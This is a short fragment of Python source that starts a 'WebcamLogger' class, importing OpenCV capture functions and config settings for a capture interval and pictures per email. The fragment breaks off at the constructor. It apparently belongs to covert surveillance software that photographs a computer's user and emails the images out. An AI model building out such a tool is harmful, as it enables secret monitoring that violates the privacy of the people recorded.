from cv2 import VideoCapture, imwrite
from os.path import join
from os import _exit
from time import sleep

from config import WEBCAM_INTERVAL, PICTURES_PER_EMAIL
from utils.tools import get_timestamp

class WebcamLogger:
    def __init__(self):
        self.interval = WEBCAM_INTERVAL
        
        self.counter = 0
        self.running = True